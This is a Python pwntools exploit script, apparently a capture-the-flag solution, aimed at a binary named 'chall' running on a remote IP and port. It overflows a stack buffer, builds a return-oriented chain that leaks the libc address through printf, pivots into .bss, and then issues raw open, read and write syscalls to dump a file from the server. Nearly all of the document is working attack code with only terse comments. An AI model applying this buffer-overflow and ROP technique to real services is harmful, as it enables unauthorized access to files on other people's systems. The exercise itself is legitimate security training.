#leak libc -> do an orw on the generate_directory_tree.py file

from pwn import *

context.binary = exe = ELF('chall', False)
libc = ELF('libc.so.6', False)

pop_args = 0x4014d9 # pop rdi; pop rsi; pop rdx; ret;
ret = 0x4014dc
rop = ROP(libc)

# io = process()
# gdb.attach(io, api=True)
io = remote('3.75.185.198', 10000)

# leak libc through printf (same technique with puts)
payload = b'\0' * 0x20 + p64(exe.bss(0x100))
payload += p64(pop_args)
payload += p64(exe.got['printf'])
payload += p64(0)
payload += p64(0)
payload += p64(ret)
payload += p64(exe.plt['printf'])
payload += p64(ret)
payload += p64(exe.symbols['main']+42)
io.sendlineafter(b': ', payload)
libc.address = u64(io.recv(6).ljust(8, b'\0')) - libc.symbols['printf']
log.info('libc.address: ' + hex(libc.address))

# get new gadget from libc
syscall = libc.address + rop.find_gadget(['syscall', 'ret'])[0]
pop_rax = libc.address + rop.find_gadget(['pop rax', 'ret'])[0]

# 1st chain to read more bytes into the new stack
payload = b'./generate_directory_tree.py'.ljust(0x20, b'\0') + p64(exe.bss(0x100))
payload += p64(pop_args)
payload += p64(0)
payload += p64(exe.bss(0x100+64))
payload += p64(0x100)
payload += p64(pop_rax)
payload += p64(0)
payload += p64(syscall)
io.sendline(payload)
time.sleep(0.2)

# 2nd chain: open/read/write
# open
payload = p64(pop_args)
payload += p64(exe.bss(0x100)-0x20)
payload += p64(0)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(2)
payload += p64(syscall)
# read
payload += p64(pop_args)
payload += p64(5)
payload += p64(exe.bss(0x200))
payload += p64(100)
payload += p64(pop_rax)
payload += p64(0)
payload += p64(syscall)
# write
payload += p64(pop_args)
payload += p64(1)
payload += p64(exe.bss(0x200))
payload += p64(100)
payload += p64(pop_rax)
payload += p64(1)
payload += p64(syscall)

payload += p64(exe.symbols['main']+42)
io.sendline(payload)

io.interactive()